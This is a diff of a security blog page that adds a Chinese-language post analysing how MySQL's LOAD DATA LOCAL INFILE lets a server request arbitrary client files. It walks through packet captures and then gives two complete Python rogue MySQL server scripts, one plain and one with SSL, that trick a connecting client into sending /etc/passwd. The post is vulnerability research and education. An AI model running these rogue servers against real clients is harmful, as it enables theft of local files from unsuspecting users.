@@ -80,7 +80,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="empty_xl" />
+  <meta name="keywords" content="mysql,mysql load local data,load data local infile,mysql本地文件读取,rogue-mysql-server,rogue-ssl-mysql-server" />
 
 
 
@@ -96,17 +96,29 @@
 
 
 
-<meta name="description" content="Hacked By_ EmPTy_xL../ security blog">
+<meta name="description" content="Mysql存在一个特性，即如果使用LOAD DATE LOCAL INFILE，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。 LOAD DATE LOCAL INFILE创建一个test表">
+<meta name="keywords" content="mysql,mysql load local data,load data local infile,mysql本地文件读取,rogue-mysql-server,rogue-ssl-mysql-server">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mysql_load_local_data">
+<meta property="og:title" content="mysql本地文件任意读取分析&#x2F;rogue-mysql(ssl)-server">
 <meta property="og:url" content="https://blog.nyrae.icu/blog/mysql-load-local-data/index.html">
 <meta property="og:site_name" content="empty_xl Blog">
-<meta property="og:description" content="Hacked By_ EmPTy_xL../ security blog">
+<meta property="og:description" content="Mysql存在一个特性，即如果使用LOAD DATE LOCAL INFILE，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。 LOAD DATE LOCAL INFILE创建一个test表">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2021-08-24T12:27:29.464Z">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/load_local_data.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/server_greeting.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/login_request.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/response_ok.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/query_version.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/query_load_local_data.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/response_tabular.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/mysql_evil_server.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/mysql_ssl_handshake.png">
+<meta property="og:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/mysql_evil_ssl_server.png">
+<meta property="og:updated_time" content="2020-12-12T13:45:02.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql_load_local_data">
-<meta name="twitter:description" content="Hacked By_ EmPTy_xL../ security blog">
+<meta name="twitter:title" content="mysql本地文件任意读取分析&#x2F;rogue-mysql(ssl)-server">
+<meta name="twitter:description" content="Mysql存在一个特性，即如果使用LOAD DATE LOCAL INFILE，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。 LOAD DATE LOCAL INFILE创建一个test表">
+<meta name="twitter:image" content="https://blog.nyrae.icu/blog/mysql-load-local-data/load_local_data.png">
 
 
 
@@ -141,7 +153,7 @@
 
 
 
-  <title>mysql_load_local_data | empty_xl Blog</title>
+  <title>mysql本地文件任意读取分析/rogue-mysql(ssl)-server | empty_xl Blog</title>
   
 
 
@@ -354,7 +366,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">mysql_load_local_data</h1>
+          <h1 class="post-title" itemprop="name headline">mysql本地文件任意读取分析/rogue-mysql(ssl)-server</h1>
         
 
         <div class="post-meta">
@@ -366,8 +378,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-08-24T20:27:29+08:00">
-                2021-08-24
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-12T21:45:02+08:00">
+                2020-12-12
               </time>
             
 
@@ -382,12 +394,34 @@
               
                 <span class="post-meta-item-text">Post modified</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2021-08-24T20:27:29+08:00">
-                2021-08-24
+              <time title="Post modified" itemprop="dateModified" datetime="2020-12-12T21:45:02+08:00">
+                2020-12-12
               </time>
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability-analysis/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnerability analysis</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -416,7 +450,29 @@
       
 
       
-        
+        <p><code>Mysql</code>存在一个特性，即如果使用<code>LOAD DATE LOCAL INFILE</code>，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。</p>
+<h3 id="LOAD-DATE-LOCAL-INFILE"><a href="#LOAD-DATE-LOCAL-INFILE" class="headerlink" title="LOAD DATE LOCAL INFILE"></a>LOAD DATE LOCAL INFILE</h3><p>创建一个test表并配置好其字段，之后客户端连接mysql服务器，执行以下指令，可以看到<code>/etc/passwd</code>的内容已经被写入test表中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>;</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<img src="/blog/mysql-load-local-data/load_local_data.png" alt="load_local_data" title="load_local_data">
+<p>为了搞清具体发生了什么，我们通过抓包来详细分析一下mysql的协议内容。</p>
+<h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><p>高版本的mysql服务器会默认使用ssl加密进行连接，会对我们的抓包造成一定的麻烦，因此可以使用<code>--ssl=disabled</code>来临时取消ssl。根据抓包的结果可以看到，当完成三次握手后，服务端会主动发送<code>greeting</code>报文，内容包括协议、版本、<code>thread id</code>、salt以及服务端支持的配置字段。可以看到有一个字段<code>Can Use LOAD DATA LOCAL</code>表明服务器支持从本地读取文件进数据库。</p>
+<img src="/blog/mysql-load-local-data/server_greeting.png" alt="server_greeting" title="server_greeting">
+<p>第二个包则是客户端发起的login request,主要是客户端支持的一些配置属性，登陆用户名，本地系统、加密方式等信息，可以看到这里也有<code>Can Use LOAD DATA LOCAL</code>字段，表名服务器支持本地文件读取的方式。</p>
+<img src="/blog/mysql-load-local-data/login_request.png" alt="login_request" title="login_request">
+<p>之后便是登陆成功的服务端回显，状态为OK，在之后就是mysql客户端连接后默认会发送的服务版本信息获取，用于本地的banner显示。</p>
+<img src="/blog/mysql-load-local-data/response_ok.png" alt="response_ok" title="response_ok">
+<img src="/blog/mysql-load-local-data/query_version.png" alt="query_version" title="query_version">
+<p>登陆成功之后的数据包便是我们发送的query和服务的response内容，我们可以看到，当请求load local data时，服务端会返回一个response tabular报文，包含了要加载的本地文件路径，客户端根据这个路径获取数据然后进行传输。因此如果我们可以构造恶意的服务器，修改发送的文件名内容，是不是就可以读取本地的任意文件。<br><img src="/blog/mysql-load-local-data/query_load_local_data.png" alt="query_load_local_data" title="query_load_local_data"><br><img src="/blog/mysql-load-local-data/response_tabular.png" alt="response_tabular" title="response_tabular"></p>
+<h3 id="mysql-evil-server"><a href="#mysql-evil-server" class="headerlink" title="mysql evil server"></a>mysql evil server</h3><p>如上述提到的流程，我们可以构造一个恶意的mysql服务器，完成认证后，由于客户端默认会发送一个mysql版本查询，此时我们回复他一个请求本地数据的包，即可读取任意的本地文件。</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">#!/usr/local/bin/python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line"></div><div class="line">'''</div><div class="line">@author: empty_xl</div><div class="line">@contact: empty_xl@163.com</div><div class="line">'''</div><div class="line">import socket</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    filename = "/etc/passwd"</div><div class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    server.bind(('', 3306))</div><div class="line">    server.listen(2)</div><div class="line">    conn, addr = server.accept()</div><div class="line">    print('connect form: &#123;&#125;'.format(addr))</div><div class="line">    # send server_greeting</div><div class="line">    conn.sendall("<span class="tag">\<span class="name">x</span></span>5b<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" + # len</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00" + # packet num</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>0a" + # protocol</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>37<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>33<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2d<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">x</span></span>38<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>34<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">x</span></span>00" + # version</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" + # thread ID</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>7c<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>1b<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>00" + # salt</div><div class="line">                 "<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xf</span></span>7" + # server cap</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>08"   + # server language</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00" + # server status</div><div class="line">                 "<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>1" + # extended server cap</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>15" + # auth plugin</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" + # unused</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>7b<span class="tag">\<span class="name">x</span></span>1d<span class="tag">\<span class="name">x</span></span>2a<span class="tag">\<span class="name">x</span></span>41<span class="tag">\<span class="name">x</span></span>63<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>3a<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>1a<span class="tag">\<span class="name">x</span></span>6b<span class="tag">\<span class="name">x</span></span>00" + #salt</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>6d<span class="tag">\<span class="name">x</span></span>79<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>71<span class="tag">\<span class="name">x</span></span>6c<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>76<span class="tag">\<span class="name">x</span></span>65<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>70<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>77<span class="tag">\<span class="name">x</span></span>6f<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>64<span class="tag">\<span class="name">x</span></span>00" # auth plugin</div><div class="line">    )</div><div class="line"></div><div class="line">    clien_data = conn.recv(2222)</div><div class="line">    print('client_data:&#123;&#125;'.format(clien_data))</div><div class="line"></div><div class="line">    conn.sendall("<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" + # len</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>02" + # packet number</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00" + # response code</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00")</div><div class="line">    print("server OK packet")</div><div class="line"></div><div class="line">    clien_data = conn.recv(2222)</div><div class="line">    print('client_data:&#123;&#125;'.format(clien_data))</div><div class="line"></div><div class="line">    print("arbitrary file read --&gt; &#123;&#125;".format(filename))</div><div class="line">    file_payload  = '<span class="tag">\<span class="name">x</span></span>0c' + "<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">xFB</span></span>" + filename</div><div class="line">    conn.sendall(file_payload)</div><div class="line"></div><div class="line">    clien_data = conn.recv(2222)</div><div class="line">    print('----------<span class="tag">\<span class="name">n</span><span class="string">&#123;&#125;</span></span>'.format(clien_data))</div><div class="line"></div><div class="line">    conn.close()</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<img src="/blog/mysql-load-local-data/mysql_evil_server.png" alt="mysql_evil_server" title="mysql_evil_server">
+<h3 id="mysql-evil-ssl-server"><a href="#mysql-evil-ssl-server" class="headerlink" title="mysql evil ssl server"></a>mysql evil ssl server</h3><p>刚我们提到，mysql是支持ssl加密的且高版本默认会使用加密的方式，在我们之前的evil server中我们将<code>switch to ssl after handshake</code>设置为了0，即不使用加密。那么为了伪装的更像点，如何实现一个mysql evil ssl server?首先我们看下正常使用ssl连接的逻辑。如下图可以看到，依旧是服务端的greeting以及客户端的login request,之后开始进行TLS握手阶段进行数据加密。</p>
+<img src="/blog/mysql-load-local-data/mysql_ssl_handshake.png" alt="mysql_ssl_handshake" title="mysql_ssl_handshake">
+<p>因此如果我们需要实现一个恶意的支持ssl的mysql服务器，首先是ssl的密钥以及证书。mysql默认会生成一个自签名证书，在<code>/var/lib/mysql/</code>中,或者也可以在<code>/etc/mysql/mysql.conf.d</code>中修改<code>ssl-cert</code>等参数的内容。以下是我们实现的evil-ssl-rogue-mysql-server</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">import socket, ssl</div><div class="line">import binascii</div><div class="line"></div><div class="line">def main():</div><div class="line">    filename = "/etc/passwd"</div><div class="line">    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)</div><div class="line">    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")</div><div class="line"></div><div class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    server.bind(('0.0.0.0', 3306))</div><div class="line">    server.listen(5)</div><div class="line"></div><div class="line">    conn, addr = server.accept()</div><div class="line">    print('connect form: &#123;&#125;'.format(addr))</div><div class="line">    print('send mysql server greeting')</div><div class="line">    # send server_greeting</div><div class="line">    conn.sendall("<span class="tag">\<span class="name">x</span></span>5b<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" + # len</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00" + # packet num</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>0a" +  # protocol</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>37<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>33<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>2d<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>75<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">x</span></span>38<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>34<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">x</span></span>00" +  # version</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" +  # thread ID</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>7c<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>1b<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>30<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>00" +  # salt</div><div class="line">                 "<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xff</span></span>" +  # server cap</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>08" +  # server language</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00" +  # server status</div><div class="line">                 "<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>80" +  # extended server cap</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>15" +  # auth plugin</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00" +  # unused</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>7b<span class="tag">\<span class="name">x</span></span>1d<span class="tag">\<span class="name">x</span></span>2a<span class="tag">\<span class="name">x</span></span>41<span class="tag">\<span class="name">x</span></span>63<span class="tag">\<span class="name">x</span></span>35<span class="tag">\<span class="name">x</span></span>3a<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>1a<span class="tag">\<span class="name">x</span></span>6b<span class="tag">\<span class="name">x</span></span>00" +  # salt</div><div class="line">                 "<span class="tag">\<span class="name">x</span></span>6d<span class="tag">\<span class="name">x</span></span>79<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>71<span class="tag">\<span class="name">x</span></span>6c<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>76<span class="tag">\<span class="name">x</span></span>65<span class="tag">\<span class="name">x</span></span>5f<span class="tag">\<span class="name">x</span></span>70<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>77<span class="tag">\<span class="name">x</span></span>6f<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>64<span class="tag">\<span class="name">x</span></span>00"</div><div class="line">                 # auth plugin</div><div class="line">                 )</div><div class="line"></div><div class="line">    clien_data = conn.recv(4)</div><div class="line">    print('Recv client data:&#123;&#125;'.format(clien_data))</div><div class="line">    data = clien_data[:3][::-1]</div><div class="line">    len = int(binascii.hexlify(data),16)</div><div class="line">    print('login record length: &#123;&#125;'.format(str(len)))</div><div class="line"></div><div class="line">    clien_data = conn.recv(len)</div><div class="line">    print('Recv client data:&#123;&#125;'.format(clien_data))</div><div class="line"></div><div class="line">    ssl_conn = context.wrap_socket(conn, server_side=True)</div><div class="line">    print('finished ssl handshake')</div><div class="line"></div><div class="line">    clien_data = ssl_conn.recv(2222)</div><div class="line">    print('Recv ssl login data: &#123;&#125;'.format(clien_data))</div><div class="line"></div><div class="line">    print("auth okay")</div><div class="line">    ssl_conn.sendall('<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00')</div><div class="line"></div><div class="line">    clien_data = ssl_conn.recv(2222)</div><div class="line">    print('First mysql query: &#123;&#125;'.format(clien_data))</div><div class="line"></div><div class="line">    print("request file")</div><div class="line"></div><div class="line">    file_payload =  "<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">xFB</span></span>" + filename</div><div class="line">    ssl_conn.sendall(file_payload)</div><div class="line"></div><div class="line">    clien_data = ssl_conn.recv(2222)</div><div class="line">    print('filedata----------<span class="tag">\<span class="name">n</span><span class="string">&#123;&#125;</span></span>'.format(clien_data))</div><div class="line"></div><div class="line">    ssl_conn.shutdown(socket.SHUT_RDWR)</div><div class="line">    ssl_conn.close()</div><div class="line">    conn.close()</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<img src="/blog/mysql-load-local-data/mysql_evil_ssl_server.png" alt="mysql_evil_ssl_server" title="mysql_evil_ssl_server">
+
       
     </div>
     
@@ -436,7 +492,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link:</strong>
-    <a href="https://blog.nyrae.icu/blog/mysql-load-local-data/" title="mysql_load_local_data">https://blog.nyrae.icu/blog/mysql-load-local-data/</a>
+    <a href="https://blog.nyrae.icu/blog/mysql-load-local-data/" title="mysql本地文件任意读取分析/rogue-mysql(ssl)-server">https://blog.nyrae.icu/blog/mysql-load-local-data/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice: </strong>
@@ -449,6 +505,18 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/vulnerability-analysis/" rel="tag"><i class="fa fa-tag"></i> vulnerability analysis</a>
+          
+            <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
+          
+            <a href="/tags/arbitrary-file-read/" rel="tag"><i class="fa fa-tag"></i> arbitrary file read</a>
+          
+            <a href="/tags/protocol-analysis/" rel="tag"><i class="fa fa-tag"></i> protocol analysis</a>
+          
+        </div>
+      
 
       
       
@@ -458,8 +526,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/blog/gitlab-djvu-rce/" rel="next" title="gitlab_djvu_rce">
-                <i class="fa fa-chevron-left"></i> gitlab_djvu_rce
+              <a href="/blog/zeroday-capture/" rel="next" title="0day捕获/Win the 0-Day Racing Game Against Botnet on Cloud">
+                <i class="fa fa-chevron-left"></i> 0day捕获/Win the 0-Day Racing Game Against Botnet on Cloud
               </a>
             
           </div>
@@ -468,8 +536,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/blog/encrypted-traffic-analysis/" rel="prev" title="encrypted_traffic_analysis">
-                encrypted_traffic_analysis <i class="fa fa-chevron-right"></i>
+              <a href="/blog/gitlab-djvu-rce/" rel="prev" title="Gitlab 13.10.2 Remote Code Execution()">
+                Gitlab 13.10.2 Remote Code Execution() <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -538,8 +606,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
@@ -554,7 +631,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">58</span>
+                <span class="site-state-item-count">59</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -576,7 +653,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">71</span>
+                <span class="site-state-item-count">73</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
@@ -631,6 +708,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
